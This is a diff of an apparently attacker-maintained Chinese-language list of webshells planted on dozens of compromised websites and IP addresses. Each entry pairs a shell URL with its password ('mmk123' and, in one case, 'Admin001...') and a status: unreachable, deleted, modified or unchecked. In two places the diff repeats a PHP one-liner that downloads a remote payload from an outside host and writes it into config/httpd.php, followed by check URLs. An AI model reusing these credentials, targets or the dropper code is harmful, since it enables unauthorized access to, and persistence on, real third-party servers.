@@ -123,6 +123,65 @@ http://101.201.39.203/template/default/bootstrap/js/js.php |mmk123 | 连不上  
 http://101.37.86.219/template/default/bootstrap/js/js.php |mmk123  | 连接不上  状态404
 http://47.95.210.105/template/default/css/m1.php |mmk123   无效站点
 https://121.196.161.139/index_bk.php |mmk123   连接不上
+http://112.126.69.37/template/template_init.php |mmk123  无法访问
+https://www.gx-biosensor.com/uploads/210329/210329/210329/210329//m1.php |mmk123 |  39.107.65.243 未执行 404被删
+http://112.124.14.199/template/template_init.php |mmk123  无法访问
+http://123.57.135.114/template/template_init.php |mmk123  无法访问
+http://101.201.118.217/core/view/simple.php |mmk123    http://101.201.118.217/config/httpd.php?d=up 无法访问
+http://120.26.90.134/template/template_init.php |mmk123  无法访问
+http://39.107.238.130:32/template/template_init.php |mmk123  无法访问
+http://8.137.153.145/template/template_init.php |mmk123   无法访问
+http://114.55.55.234/template/template_init.php |mmk123 |www.glassflake.cn  没有备案 | Invalid domain   无法访问
+http://39.105.11.50/template/template_init.php |mmk123    无法访问
+http://120.26.246.137/template_init.php |mmk123     http://120.26.246.137/config/httpd.php?d=up  无法访问
+http://47.120.70.53/template/template_init.php |mmk123   无法访问
+http://www.xn--wlq673eova83m.cn/core/extend/code/simple.php |mmk123 |  124.222.129.233   无法访问
+http://124.222.129.233/core/extend/code/simple.php |mmk123    无法访问
+http://by.yanchengquan.com/template/template_init.php |mmk123 |提取 | 182.16.47.67 |    http://by.yanchengquan.com/doo.php?d=template  404被删
+https://www.crystunion.com/template/default/simple.php |mmk123 |  47.105.45.80    https://www.crystunion.com/doo.php?d=template  404被删
+https://www.tzsps.com/static/images/m1.php |mmk123 |  106.54.60.101  404被删
+https://www.1000ma.net/static/backup/sql/m1.php |mmk123 |  120.77.152.51   https://www.1000ma.net/config/httpd.php?d=up 404被删
+http://47.101.51.162/template/default/bootstrap/js/js.php |mmk123    http://47.101.51.162/config/httpd.php?d=up  无法访问
+http://47.102.194.106/template/default/bootstrap/js/js.php |mmk123     http://47.102.194.106/config/httpd.php?d=up 无法访问
+http://47.113.123.5/template/default/bootstrap/js/js.php |mmk123    http://47.113.123.5/config/httpd.php?d=up 无法访问
+http://114.55.129.167/template/default/bootstrap/js/js.php |mmk123   http://114.55.129.167/config/httpd.php?d=up 无法访问
+http://47.99.75.245/template/default/bootstrap/js/js.php |mmk123    http://47.99.75.245/config/httpd.php?d=up
+找不到站点
+http://39.106.48.93/template/default/bootstrap/js/js.php |mmk123 无法访问
+http://39.105.19.82/template/default/bootstrap/js/js.php |mmk123    http://39.105.19.82/config/httpd.php?d=up  404被删
+http://47.93.222.16/template/default/bootstrap/js/js.php |mmk123     http://47.93.222.16/config/httpd.php?d=up 页面404
+http://39.106.73.142/apps/api/model/wap.php |mmk123 无法访问
+http://ke.kongquewangxiao.com/app/resource/css/boot.php |mmk123 |  121.196.161.139   http://ke.kongquewangxiao.com/data/httpd.php?d=up 无法访问
+http://ke.kongquewangxiao.com/index_bk.php |mmk123    连不上
+http://www.kongquewangxiao.com/themes/js/js.php |mmk123 |  121.196.161.139   连不上
+https://121.196.161.139/index_bk.php |mmk123   404被删
+http://47.122.46.79/core/cache/Redis.php |mmk123   404被删
+http://47.122.46.79/index_bk.php |mmk123   404被删
+http://114.215.157.212:8885/apps/api/view/default/index_bk.php |mmk123   404被删 
+http://114.215.157.212:8885/index_bk.php |mmk123    404被删
+http://tnt.zdxinfo.com/assets/css/skins/skin.php |mmk123 |  123.56.182.44 | 404  404被删
+http://fy.whqrlm.com/apps/admin/m1.php |mmk123 |  123.56.182.44 404被删
+代码更新：0608 ✅
+http://fy.whqrlm.com/rewrite/httpd.php 404被删
+<?php file_put_contents("../config/httpd.php",file_get_contents("https://static.alicloudoss.com/mw/wbsh/del_do.min.txt"));?>
+执行检查：
+http://fy.whqrlm.com/config/httpd.php?d=up
+http://www.xrca.com.cn/static/index_bk.php |mmk123 |  101.200.217.38
+代码更新：0608 ✅
+http://www.xrca.com.cn/rewrite/httpd.php 404被删
+<?php file_put_contents("../config/httpd.php",file_get_contents("https://static.alicloudoss.com/mw/wbsh/del_do.min.txt"));?>
+执行检查：
+http://www.xrca.com.cn/config/httpd.php?d=up
+http://36.137.146.112:9001/template/default/fileinput/css/index_bk.php |mmk123  404被删
+http://36.137.146.112:9001/index_bk.php |mmk123  404被删
+http://118.25.152.47:7077/index_bk.php |mmk123  404被删
+https://www.alsophila.net/indexbak.php大马 |Admin001... |大马 | 111.229.208.84 404被删
+https://111.229.208.84/runtime/data/9e776527ecbc372af46aafe2257957ebfd4.php |mmk123 
+https://111.229.208.84/index_bk.php |mmk123 404被删
+http://123.56.162.208/index_bk.php |mmk123 404被删
+http://8.140.22.9/index_bk.php |mmk123 404被删
+http://49.235.71.132:384/index_bk.php |mmk123 404被删
+
 
 
 
@@ -131,99 +190,38 @@ https://121.196.161.139/index_bk.php |mmk123   连接不上
 可以修改的
 
 
-http://112.126.69.37/template/template_init.php |mmk123 
-http://8.138.18.52/template/template_init.php |mmk123 
-http://43.138.246.227/template/template_init.php |mmk123 
-https://www.gx-biosensor.com/uploads/210329/210329/210329/210329//m1.php |mmk123 |  39.107.65.243 未执行
-http://47.106.151.193/template/template_init.php |mmk123 
-http://112.74.55.251:32/template/template_init.php |mmk123      http://112.74.55.251:32/config/httpd.php?d=up
-http://112.124.14.199/template/template_init.php |mmk123 
-http://8.130.107.246/template/template_init.php |mmk123 
-http://8.138.1.80/template/template_init.php |mmk123  
-http://123.57.135.114/template/template_init.php |mmk123 
-http://106.15.239.172:32/template/template_init.php |mmk123 
-http://101.201.118.217/core/view/simple.php |mmk123    http://101.201.118.217/config/httpd.php?d=up
-http://111.229.254.166/template/template_init.php |mmk123 
-http://120.26.90.134/template/template_init.php |mmk123 
-http://39.107.238.130:32/template/template_init.php |mmk123
-http://8.137.153.145/template/template_init.php |mmk123 
-http://39.105.11.50/template/template_init.php |mmk123 
-http://114.55.55.234/template/template_init.php |mmk123 |www.glassflake.cn  没有备案 | Invalid domain 
-http://120.26.246.137/template_init.php |mmk123     http://120.26.246.137/config/httpd.php?d=up
-http://47.120.70.53/template/template_init.php |mmk123 
-http://www.xn--wlq673eova83m.cn/core/extend/code/simple.php |mmk123 |  124.222.129.233
-http://124.222.129.233/core/extend/code/simple.php |mmk123 
-http://www.lgms56.cn/skin/images/m1.php |mmk123 |  114.55.130.128
-http://121.36.109.42/template/template_init.php |mmk123 
-http://114.55.130.128:9090/template/template_init.php |mmk123 
-http://cablewiresfactory.com/template/template_init.php |mmk123 |  216.224.127.219
-http://www.juheyuanjing.com/template/template_init.php |mmk123 |RSA 编码器--提取 | 129.227.60.74
-http://cs.jsmbr.top/template/template_init.php |mmk123 |  43.129.26.37
-http://by.yanchengquan.com/template/template_init.php |mmk123 |提取 | 182.16.47.67 |    http://by.yanchengquan.com/doo.php?d=template
-https://xqu.ruantu.fun/template/default/simple.php |mmk123 |  47.121.31.234
-https://www.crystunion.com/template/default/simple.php |mmk123 |  47.105.45.80    https://www.crystunion.com/doo.php?d=template
-https://introduce.crword.shop/index_bk.php |mmk123 |  124.222.235.221    https://introduce.crword.shop/doo.php?d=template
-https://www.tzsps.com/static/images/m1.php |mmk123 |  106.54.60.101
+http://8.138.18.52/template/template_init.php |mmk123  已改
+http://43.138.246.227/template/template_init.php |mmk123   已改
+http://47.106.151.193/template/template_init.php |mmk123    已改
+http://112.74.55.251:32/template/template_init.php |mmk123      http://112.74.55.251:32/config/httpd.php?d=up    已改
+http://8.130.107.246/template/template_init.php |mmk123   已改
+http://8.138.1.80/template/template_init.php |mmk123    已改
+http://106.15.239.172:32/template/template_init.php |mmk123   已改
+http://111.229.254.166/template/template_init.php |mmk123   已改
+http://www.lgms56.cn/skin/images/m1.php |mmk123 |  114.55.130.128 已改
+http://121.36.109.42/template/template_init.php |mmk123  已改
+http://114.55.130.128:9090/template/template_init.php |mmk123   已改
+http://cablewiresfactory.com/template/template_init.php |mmk123 |  216.224.127.219 已改
+http://www.juheyuanjing.com/template/template_init.php |mmk123 |RSA 编码器--提取 | 129.227.60.74 已改
+http://cs.jsmbr.top/template/template_init.php |mmk123 |  43.129.26.37 已改
+https://xqu.ruantu.fun/template/default/simple.php |mmk123 |  47.121.31.234 已改
+https://introduce.crword.shop/index_bk.php |mmk123 |  124.222.235.221    https://introduce.crword.shop/doo.php?d=template 已改
 http://c.fangac.cn/three/three.js-master/src/geometries/m1.php |mmk123 |  114.55.58.214 |  手动修改
-http://lybt.fangac.cn/core/cache/m1.php |mmk123 |  114.55.58.214
-https://huace.darexian.com/static/backup/sql/m1.php |mmk123 |  8.134.216.133  https://huace.darexian.com/config/httpd.php?d=up
-https://www.1000ma.net/static/backup/sql/m1.php |mmk123 |  120.77.152.51   https://www.1000ma.net/config/httpd.php?d=up
-http://www.gzchaoyinsu.com/template/default/bootstrap/js/js.php |mmk123 |  120.77.250.124
-http://112.124.15.47/template/default/bootstrap/js/js.php |mmk123     http://112.124.15.47/config/httpd.php?d=up
-http://47.101.51.162/template/default/bootstrap/js/js.php |mmk123    http://47.101.51.162/config/httpd.php?d=up
-http://121.40.25.18/template/default/bootstrap/js/js.php |mmk123    http://121.40.25.18/config/httpd.php?d=up
-http://47.102.194.106/template/default/bootstrap/js/js.php |mmk123     http://47.102.194.106/config/httpd.php?d=up
-http://47.113.123.5/template/default/bootstrap/js/js.php |mmk123    http://47.113.123.5/config/httpd.php?d=up
-http://47.94.13.2:8000/template/default/bootstrap/js/js.php |mmk123     http://47.94.13.2:8000/config/httpd.php?d=up
-http://47.93.60.207/template/default/bootstrap/js/js.php |mmk123     http://47.93.60.207/config/httpd.php?d=up
-http://114.55.129.167/template/default/bootstrap/js/js.php |mmk123   http://114.55.129.167/config/httpd.php?d=up
-http://47.99.75.245/template/default/bootstrap/js/js.php |mmk123    http://47.99.75.245/config/httpd.php?d=up
-http://39.106.48.93/template/default/bootstrap/js/js.php |mmk123
-http://39.105.19.82/template/default/bootstrap/js/js.php |mmk123    http://39.105.19.82/config/httpd.php?d=up
-http://47.93.222.16/template/default/bootstrap/js/js.php |mmk123     http://47.93.222.16/config/httpd.php?d=up
-http://123.57.11.49/template/default/fileinput/.github/m1.php |mmk123   http://123.57.11.49/config/httpd.php?d=up
-http://39.106.73.142/apps/api/model/wap.php |mmk123
-http://ke.kongquewangxiao.com/app/resource/css/boot.php |mmk123 |  121.196.161.139   http://ke.kongquewangxiao.com/data/httpd.php?d=up
+http://lybt.fangac.cn/core/cache/m1.php |mmk123 |  114.55.58.214 已改
+https://huace.darexian.com/static/backup/sql/m1.php |mmk123 |  8.134.216.133  https://huace.darexian.com/config/httpd.php?d=up 已改
+http://www.gzchaoyinsu.com/template/default/bootstrap/js/js.php |mmk123 |  120.77.250.124 已改
+http://112.124.15.47/template/default/bootstrap/js/js.php |mmk123     http://112.124.15.47/config/httpd.php?d=up   已改
+http://121.40.25.18/template/default/bootstrap/js/js.php |mmk123    http://121.40.25.18/config/httpd.php?d=up 已改
+http://47.94.13.2:8000/template/default/bootstrap/js/js.php |mmk123     http://47.94.13.2:8000/config/httpd.php?d=up   已改
+http://47.93.60.207/template/default/bootstrap/js/js.php |mmk123     http://47.93.60.207/config/httpd.php?d=up   已改
+http://123.57.11.49/template/default/fileinput/.github/m1.php |mmk123   http://123.57.11.49/config/httpd.php?d=up  已改
+
+
 
 
 
 
 未检查的
-
-http://ke.kongquewangxiao.com/index_bk.php |mmk123 
-http://www.kongquewangxiao.com/themes/js/js.php |mmk123 |  121.196.161.139
-
-https://121.196.161.139/index_bk.php |mmk123 
-http://47.122.46.79/core/cache/Redis.php |mmk123 
-http://47.122.46.79/index_bk.php |mmk123 
-http://114.215.157.212:8885/apps/api/view/default/index_bk.php |mmk123 
-http://114.215.157.212:8885/index_bk.php |mmk123 
-
-http://tnt.zdxinfo.com/assets/css/skins/skin.php |mmk123 |  123.56.182.44 | 404
-
-http://fy.whqrlm.com/apps/admin/m1.php |mmk123 |  123.56.182.44
-代码更新：0608 ✅
-http://fy.whqrlm.com/rewrite/httpd.php
-<?php file_put_contents("../config/httpd.php",file_get_contents("https://static.alicloudoss.com/mw/wbsh/del_do.min.txt"));?>
-执行检查：
-http://fy.whqrlm.com/config/httpd.php?d=up
-
-http://www.xrca.com.cn/static/index_bk.php |mmk123 |  101.200.217.38
-代码更新：0608 ✅
-http://www.xrca.com.cn/rewrite/httpd.php
-<?php file_put_contents("../config/httpd.php",file_get_contents("https://static.alicloudoss.com/mw/wbsh/del_do.min.txt"));?>
-执行检查：
-http://www.xrca.com.cn/config/httpd.php?d=up
-
-http://36.137.146.112:9001/template/default/fileinput/css/index_bk.php |mmk123 
-http://36.137.146.112:9001/index_bk.php |mmk123 
-http://118.25.152.47:7077/index_bk.php |mmk123 
-https://www.alsophila.net/indexbak.php大马 |Admin001... |大马 | 111.229.208.84
-https://111.229.208.84/runtime/data/9e776527ecbc372af46aafe2257957ebfd4.php |mmk123 
-https://111.229.208.84/index_bk.php |mmk123 
-http://123.56.162.208/index_bk.php |mmk123 
-http://8.140.22.9/index_bk.php |mmk123 
-http://49.235.71.132:384/index_bk.php |mmk123 
 
 http://bama.jnlg.com.cn/assets/css/skins/skins.php |mmk123 |  111.229.186.206 | 404
 http://ziku.jnlg.com.cn/h5/js/rem.php |mmk123 |  111.229.186.206
